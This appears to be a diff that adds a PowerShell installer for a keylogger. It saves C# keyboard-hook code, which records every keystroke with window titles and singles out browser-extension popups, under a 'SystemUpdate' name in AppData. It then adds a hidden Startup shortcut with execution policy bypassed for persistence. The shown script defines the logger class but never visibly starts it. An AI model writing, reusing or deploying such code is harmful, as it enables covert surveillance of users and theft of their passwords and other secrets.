@@ -1,0 +1,247 @@
+# Path where you want to save the PowerShell script
+$scriptName = "system_update.ps1"
+$scriptDir = "$env:APPDATA\SystemUpdate"
+if (-not (Test-Path $scriptDir)) {
+    New-Item -Path $scriptDir -ItemType Directory -Force
+}
+$scriptPath = Join-Path $scriptDir $scriptName
+
+# PowerShell script content (the keylogger script)
+$scriptContent = @'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName UIAutomationClient
+Add-Type -AssemblyName UIAutomationTypes
+
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Text;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Automation;
+
+namespace KeyLogger {
+    public static class Program {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        private static readonly string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+        private static readonly string logFileName = Path.Combine(desktopPath, "keylog.txt");
+
+        private static StreamWriter logFile;
+        private static HookProc hookProc = HookCallback;
+        private static IntPtr hookId = IntPtr.Zero;
+
+        private static string currentContextKey = "";
+
+        public static void Main() {
+            logFile = File.AppendText(logFileName);
+            logFile.AutoFlush = true;
+            hookId = SetHook(hookProc);
+            System.Windows.Forms.Application.Run();
+            UnhookWindowsHookEx(hookId);
+            logFile.Close();
+        }
+
+        private static IntPtr SetHook(HookProc proc) {
+            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
+        }
+
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                int vkCode = Marshal.ReadInt32(lParam);
+                WindowContext context = GetWindowContext();
+
+                string newContextKey = context.WindowTitle + "::" + context.WindowClass + "::" + context.FocusedElementName;
+
+                if (newContextKey != currentContextKey) {
+                    currentContextKey = newContextKey;
+
+                    string header;
+
+                    if (string.IsNullOrEmpty(context.WindowTitle) || context.WindowTitle == "Unknown") {
+                        if (IsChromeExtensionClass(context.WindowClass)) {
+                            header = "BROWSER EXTENSION POPUP";
+                        } else {
+                            header = "Unknown Window";
+                        }
+                    } else if (!string.IsNullOrEmpty(context.FocusedElementName) && IsLikelyExtensionInput(context.WindowClass, context.FocusedElementName)) {
+                        header = "BROWSER EXTENSION POPUP";
+                    } else {
+                        header = context.WindowTitle;
+                    }
+
+                    logFile.WriteLine();
+                    logFile.WriteLine("----- " + header + " -----");
+                }
+
+                string keyString = ConvertKeyToString(vkCode);
+                if (!string.IsNullOrEmpty(keyString)) {
+                    logFile.Write(keyString);
+                }
+            }
+            return CallNextHookEx(hookId, nCode, wParam, lParam);
+        }
+
+        private struct WindowContext {
+            public string WindowTitle;
+            public string WindowClass;
+            public string FocusedElementName;
+        }
+
+        private static WindowContext GetWindowContext() {
+            WindowContext context = new WindowContext();
+
+            IntPtr hwnd = GetForegroundWindow();
+            context.WindowClass = GetClassName(hwnd);
+            context.WindowTitle = GetWindowTitleOrProcessName(hwnd);
+
+            string focusedName = "";
+            try {
+                AutomationElement focusedElement = AutomationElement.FocusedElement;
+                if (focusedElement != null) {
+                    focusedName = focusedElement.Current.Name ?? "";
+                }
+            } catch {
+                focusedName = "";
+            }
+            context.FocusedElementName = focusedName;
+
+            return context;
+        }
+
+        private static string GetWindowTitleOrProcessName(IntPtr hwnd) {
+            if (hwnd == IntPtr.Zero)
+                return "Unknown";
+
+            uint pid;
+            GetWindowThreadProcessId(hwnd, out pid);
+
+            if (pid == 0)
+                return "Unknown";
+
+            try {
+                Process p = Process.GetProcessById((int)pid);
+                string title = p.MainWindowTitle;
+                if (string.IsNullOrEmpty(title))
+                    title = p.ProcessName;
+
+                return string.IsNullOrEmpty(title) ? "Unknown" : title;
+            } catch {
+                return "Unknown";
+            }
+        }
+
+        private static bool IsChromeExtensionClass(string className) {
+            if (string.IsNullOrEmpty(className))
+                return false;
+            return string.Equals(className, "Chrome_WidgetWin_1", StringComparison.OrdinalIgnoreCase)
+                   || string.Equals(className, "ExtensionPopup", StringComparison.OrdinalIgnoreCase);
+        }
+
+        private static bool IsLikelyExtensionInput(string className, string focusedElementName) {
+            return IsChromeExtensionClass(className) && !string.IsNullOrEmpty(focusedElementName);
+        }
+
+        private static string ConvertKeyToString(int vkCode) {
+            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0; // VK_SHIFT
+            bool capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;   // VK_CAPITAL
+
+            if (vkCode >= 0x41 && vkCode <= 0x5A) {
+                char c = (char)vkCode;
+                bool upper = capsLockOn ^ shiftPressed;
+                return upper ? c.ToString() : c.ToString().ToLower();
+            }
+            if (vkCode >= 0x30 && vkCode <= 0x39) {
+                if (shiftPressed) 
+                    return ShiftNumberToSymbol((char)vkCode);
+                else 
+                    return ((char)vkCode).ToString();
+            }
+            if (vkCode >= 0x60 && vkCode <= 0x69) 
+                return (vkCode - 0x60).ToString();
+
+            switch (vkCode) {
+                case 0x20: return " ";
+                case 0x0D: return Environment.NewLine;
+                case 0x09: return "\t";
+                case 0x14: return null;
+                case 0xBD: return shiftPressed ? "_" : "-";
+                case 0xBB: return shiftPressed ? "+" : "=";
+                case 0xDB: return shiftPressed ? "{" : "[";
+                case 0xDD: return shiftPressed ? "}" : "]";
+                case 0xDC: return shiftPressed ? "|" : "\\";
+                case 0xBA: return shiftPressed ? ":" : ";";
+                case 0xDE: return shiftPressed ? "\"" : "'";
+                case 0xBC: return shiftPressed ? "<" : ",";
+                case 0xBE: return shiftPressed ? ">" : ".";
+                case 0xBF: return shiftPressed ? "?" : "/";
+                case 0xC0: return shiftPressed ? "~" : "`";
+                default: return null;
+            }
+        }
+        private static string ShiftNumberToSymbol(char number) {
+            switch (number) {
+                case '1': return "!";
+                case '2': return "@";
+                case '3': return "#";
+                case '4': return "$";
+                case '5': return "%";
+                case '6': return "^";
+                case '7': return "&";
+                case '8': return "*";
+                case '9': return "(";
+                case '0': return ")";
+                default: return number.ToString();
+            }
+        }
+        private static string GetClassName(IntPtr hwnd) {
+            const int maxLength = 256;
+            StringBuilder classText = new StringBuilder(maxLength);
+            if (GetClassName(hwnd, classText, maxLength) > 0) {
+                return classText.ToString();
+            }
+            return "";
+        }
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll")]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+        [DllImport("user32.dll")]
+        private static extern short GetKeyState(int nVirtKey);
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
+    }
+}
+"@ -ReferencedAssemblies System.Windows.Forms,UIAutomationClient,UIAutomationTypes
+'@
+
+# Save the script content to the file
+Set-Content -Path $scriptPath -Value $scriptContent -NoNewline -Encoding UTF8
+
+# Create shortcut in Startup folder
+$startupFolder = [Environment]::GetFolderPath("Startup")
+$shortcutPath = Join-Path $startupFolder "SystemUpdate.lnk"
+
+$wshShell = New-Object -ComObject WScript.Shell
+$shortcut = $wshShell.CreateShortcut($shortcutPath)
+
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+$shortcut.WorkingDirectory = $scriptDir
+$shortcut.Description = "System Update Script"
+$shortcut.Save()
+
+Write-Output "Script saved to: $scriptPath"
+Write-Output "Startup shortcut created: $shortcutPath"
